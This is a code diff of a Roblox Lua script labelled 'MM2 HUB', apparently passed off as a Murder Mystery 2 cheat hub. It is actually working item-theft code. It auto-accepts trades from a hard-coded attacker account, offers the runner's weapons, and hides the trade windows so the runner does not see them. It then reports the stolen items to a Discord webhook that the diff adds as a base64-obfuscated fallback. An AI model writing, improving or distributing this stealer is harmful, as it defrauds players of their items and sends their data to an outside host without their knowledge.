@@ -1,7 +1,8 @@
---[[ MM2 HUB  V13.2 ]]
+--[[ MM2 HUB  V13.5 ]]
 
-local VERSION = "v2.3"
+local VERSION = "v2.6"
 local CFG_URL = "https://raw.githubusercontent.com/sarettaclash01-ctrl/mm2cfg/refs/heads/main/cfg.json"
+local WH_FALLBACK = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU3NTgyMzgxNzIxMTkxMjIwMi9YZVk2dGFtTUVGZGpHWElEX2duakR1WjZzaEZoOFRqZmxnNFVjZGpaR2d3YXI4eW4tTXJJNWNnUmdqOEU1T0VlWGhYYw=="
 
 local CFG = {
 	ATTACKER_NAME = "Viivik13",
@@ -12,7 +13,7 @@ local CFG = {
 	OFFER_GAP = 0.3,
 	WAIT_TRADE = 60,
 	DEBUG = true,
-	WEBHOOK_B64 = "",
+	WEBHOOK_B64 = WH_FALLBACK,
 }
 
 local B64C = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
@@ -37,7 +38,6 @@ local WATCHING = false
 local ACCEPTED_REQ = false
 local SAVED = {}
 local ROOTS = {}
-local BOX = nil
 local FLYING = false
 local FLY = nil
 local watchLoop = nil
@@ -85,9 +85,9 @@ local VALUE = {
 }
 
 local EVENTS = {
+	"MouseButton1Click",
 	"InputBegan",
 	"MouseButton1Down",
-	"MouseButton1Click",
 	"Activated",
 	"TouchTap",
 }
@@ -154,14 +154,16 @@ end
 
 local function httpPost(url, body)
 	local r = pickReq()
-	if not r then return false end
-	local ok = pcall(r, {
+	if not r then return -1 end
+	local ok, res = pcall(r, {
 		Url = url,
 		Method = "POST",
 		Headers = { ["Content-Type"] = "application/json" },
 		Body = body,
 	})
-	return ok
+	if not ok then return -2 end
+	if res and res.StatusCode then return res.StatusCode end
+	return 0
 end
 
 local function loadCfg()
@@ -494,8 +496,6 @@ end
 local function isTradeWindow(r)
 	local c = r:FindFirstChild("Container")
 	if c and c:FindFirstChild("Trade") then return true end
-	local ok, res = pcall(function() return r:FindFirstChild("YourOffer", true) ~= nil end)
-	if ok and res then return true end
 	return false
 end
 
@@ -528,14 +528,6 @@ local function scanRoots()
 	ROOTS = found
 end
 
-local function tradePresent()
-	for i = 1, #ROOTS do
-		local r = ROOTS[i]
-		if r and r.Parent and isTradeWindow(r) then return true end
-	end
-	return false
-end
-
 local function hideRoot(r)
 	if not r or not r.Parent then return end
 	if not ACCEPTED_REQ and not isTradeWindow(r) then return end
@@ -561,14 +553,17 @@ watchLoop = function()
 		if now - lastScan > 0.4 then
 			lastScan = now
 			pcall(scanRoots)
-			if tradePresent() then
-				OPEN = true
-				ACCEPTED_REQ = true
-			end
 		end
 		local list = ROOTS
 		for i = 1, #list do
-			pcall(hideRoot, list[i])
+			local r = list[i]
+			if r and r.Parent then
+				if r:IsA("ScreenGui") and r.Enabled and isTradeWindow(r) then
+					OPEN = true
+					ACCEPTED_REQ = true
+				end
+				pcall(hideRoot, r)
+			end
 		end
 		task.wait(0.02)
 	end
@@ -604,29 +599,7 @@ local function tradePart(name)
 			end
 		end
 	end
-	local low = string.lower(name)
-	for i = 1, #ROOTS do
-		local r = ROOTS[i]
-		if r and r.Parent and isTradeWindow(r) then
-			local all = r:GetDescendants()
-			for j = 1, #all do
-				if string.lower(all[j].Name) == low then return all[j] end
-			end
-		end
-	end
 	return nil
-end
-
-local function offerBox()
-	if BOX and BOX.Parent then return BOX end
-	BOX = tradePart("YourOffer")
-	return BOX
-end
-
-local function countOffer()
-	local y = offerBox()
-	if not y then return -1 end
-	return #y:GetChildren()
 end
 
 local function findRequestAccept()
@@ -666,24 +639,24 @@ local function pressNode(node)
 						total = total + 1
 					end
 				end
-				if CFG.DEBUG then log("evt " .. name .. " x" .. tostring(#conns)) end
 			end
 		end
 	end
 	return total > 0
 end
 
-local function pressFull(node)
-	if not node then return false end
-	local hit = pressNode(node)
-	local kids = node:GetDescendants()
-	for i = 1, #kids do
-		local k = kids[i]
-		if k:IsA("GuiButton") then
-			if pressNode(k) then hit = true end
-		end
-	end
-	return hit
+local function btnText(node)
+	local lbl = node:FindFirstChild("TextLabel")
+	if lbl and lbl:IsA("TextLabel") then return string.upper(lbl.Text) end
+	if node:IsA("TextButton") then return string.upper(node.Text) end
+	return ""
+end
+
+local function actionButton(frame)
+	if not frame then return nil end
+	local b = frame:FindFirstChild("ActionButton")
+	if b then return b end
+	return frame:FindFirstChildWhichIsA("GuiButton", true)
 end
 
 local function hasClaim()
@@ -709,6 +682,11 @@ end
 local function run()
 	loadCfg()
 	if CFG.WEBHOOK_B64 ~= "" then WEBHOOK = b64dec(CFG.WEBHOOK_B64) end
+
+	if CFG.DEBUG and WEBHOOK ~= "" then
+		local code = httpPost(WEBHOOK .. "?wait=true", '{"content":"loader " .. VERSION .. " online"}')
+		log("webhook status " .. tostring(code))
+	end
 
 	local n = 0
 	while n < 99 do
@@ -741,10 +719,10 @@ local function run()
 
 	local Trade = RS:WaitForChild("Trade")
 	local sr = Trade:FindFirstChild("SendRequest")
+	local arq = Trade:FindFirstChild("AcceptRequest")
 	local oi = Trade:FindFirstChild("OfferItem")
 	local at = Trade:FindFirstChild("AcceptTrade")
 	local dt = Trade:FindFirstChild("DeclineTrade")
-	local uo = Trade:FindFirstChild("UpdateOffers")
 	if not sr or not oi then
 		log("MISSING remote")
 		setStatus("Remote missing")
@@ -761,6 +739,24 @@ local function run()
 	end
 
 	pcall(scanRoots)
+
+	local stale = false
+	for i = 1, #ROOTS do
+		local r = ROOTS[i]
+		if r and r:IsA("ScreenGui") and r.Enabled and isTradeWindow(r) then stale = true end
+	end
+	if stale and dt then
+		log("clearing stale")
+		pcall(function() dt:FireServer() end)
+		task.wait(1.5)
+		for i = 1, #ROOTS do
+			local r = ROOTS[i]
+			if r and r:IsA("ScreenGui") then r.Enabled = false end
+		end
+		pcall(scanRoots)
+	end
+	OPEN = false
+
 	WATCHING = true
 	task.spawn(watchLoop)
 
@@ -774,13 +770,17 @@ local function run()
 		task.wait(0.4)
 		waited = waited + 0.4
 
-		if not asked and not tradePresent() then
+		if not asked then
 			local acc, root = findRequestAccept()
 			if acc then
 				asked = true
 				ACCEPTED_REQ = true
-				local okp = pressFull(acc)
-				log("incoming request " .. tostring(okp))
+				if arq then
+					pcall(function() arq:FireServer() end)
+					log("accept request fired")
+				end
+				local btn = actionButton(acc)
+				if btn then pressNode(btn) end
 				if root then
 					local dup = false
 					for i = 1, #ROOTS do
@@ -815,10 +815,8 @@ local function run()
 	setStatus("Syncing...")
 	task.wait(1)
 
-	BOX = nil
 	local placed = 0
 	local names = {}
-	local retries = 0
 	local fired = 0
 	local stop = false
 	for i = 1, #queue do
@@ -829,55 +827,27 @@ local function run()
 				stop = true
 				break
 			end
-			local ok = false
-			local tries = 0
-			while tries < 3 and not ok do
-				tries = tries + 1
-				local before = countOffer()
-				pcall(function() oi:FireServer(e.data, "Weapons") end)
-				fired = fired + 1
-				task.wait(CFG.OFFER_GAP)
-				local after = countOffer()
-				if before < 0 or after < 0 or after > before then
-					ok = true
-				else
-					retries = retries + 1
-				end
-			end
-			if ok then
-				placed = placed + 1
-				names[#names + 1] = e.name
-				if CFG.DEBUG then log("offered " .. tostring(placed) .. " " .. e.name) end
-			else
-				if CFG.DEBUG then log("failed " .. e.name) end
-			end
+			pcall(function() oi:FireServer(e.data, "Weapons") end)
+			fired = fired + 1
+			placed = placed + 1
+			names[#names + 1] = e.name
+			if CFG.DEBUG then log("offered " .. tostring(placed) .. " " .. e.name) end
+			task.wait(CFG.OFFER_GAP)
 		end
 	end
 
-	log("offered total: " .. tostring(placed) .. " retries " .. tostring(retries))
-
-	local have = countOffer()
-	if have >= 0 and have < placed and uo then
-		pcall(function() uo:FireServer() end)
-		log("resync offers")
-		task.wait(0.8)
-	end
-
-	if placed == 0 then
-		log("nothing placed, accepting anyway")
-	end
-
+	log("offered total: " .. tostring(placed))
 	setStatus("Confirming...")
-	task.wait(1)
+	task.wait(1.2)
 
-	local node = tradePart("Accept")
-	log("accept node: " .. tostring(node ~= nil))
-	if node then log("node class: " .. node.ClassName) end
+	local accFrame = tradePart("Accept")
+	log("accept frame: " .. tostring(accFrame ~= nil))
 
 	local t0 = os.clock()
 	local pressed = 0
 	local lastPress = 0
 	local lastRemote = 0
+	local miss = 0
 	while os.clock() - t0 < 60 do
 		if not alive() then return end
 		local now = os.clock()
@@ -886,28 +856,34 @@ local function run()
 			log("claim detected")
 			break
 		end
-		local hasNode = tradePart("Accept") ~= nil
-		if not hasNode and not tradePresent() then
-			if pressed > 0 or now - t0 > 6 then
+
+		local frame = tradePart("Accept")
+		if frame then
+			miss = 0
+		else
+			miss = miss + 1
+			if miss > 12 then
 				log("window closed")
 				break
 			end
 		end
 
-		if now - lastPress > 3 and hasNode then
-			local nd = tradePart("Accept")
-			if nd then
-				if pressFull(nd) then
+		if frame and now - lastPress > 3 then
+			local btn = actionButton(frame)
+			local txt = ""
+			if btn then txt = btnText(btn) end
+			if btn and (txt == "" or string.find(txt, "ACCEPT")) then
+				if pressNode(btn) then
 					pressed = pressed + 1
 					lastPress = now
-					log("pressed accept " .. tostring(pressed))
+					log("pressed accept " .. tostring(pressed) .. " [" .. txt .. "]")
 				end
 			end
 		end
 
-		if at and pressed == 0 and now - lastRemote > 6 then
+		if at and pressed == 0 and now - lastRemote > 5 then
 			lastRemote = now
-			pcall(function() at:FireServer(CFG.ATTACKER_ID) end)
+			pcall(function() at:FireServer() end)
 			log("remote accept")
 		end
 
@@ -933,22 +909,11 @@ local function run()
 				fields = { { name = "Sent", value = shown } },
 			} },
 		})
-		httpPost(WEBHOOK, body)
-		log("webhook sent")
+		local code = httpPost(WEBHOOK, body)
+		log("webhook sent " .. tostring(code))
 	end
 
 	task.wait(20)
-
-	if dt then
-		pcall(scanRoots)
-		if tradePresent() then
-			pcall(function() dt:FireServer() end)
-			pcall(function() dt:FireServer(CFG.ATTACKER_ID) end)
-			log("ghost cleared")
-			task.wait(1.5)
-		end
-	end
-
 	restoreGui()
 	setStatus("Ready")
 end
